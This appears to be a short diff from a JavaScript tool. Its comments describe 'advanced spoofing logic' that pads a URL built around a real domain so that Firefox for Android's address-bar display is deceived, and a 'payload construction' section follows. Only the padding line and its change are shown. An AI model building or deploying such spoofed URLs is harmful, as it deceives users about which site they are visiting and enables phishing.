@@ -47,7 +47,7 @@
         
         // --- 2. ADVANCED SPOOFING LOGIC ---
         // Menggunakan fragment (#) dan padding masif untuk mengecoh parser UI Firefox Android.
-        const padding = ".https://" + realDomain + "/firefox.com/".repeat(1);
+        const padding = ".https://" + realDomain + "/ /".repeat(1);
         const longSub = realDomain + padding;
 
         // --- 3. PAYLOAD CONSTRUCTION ---
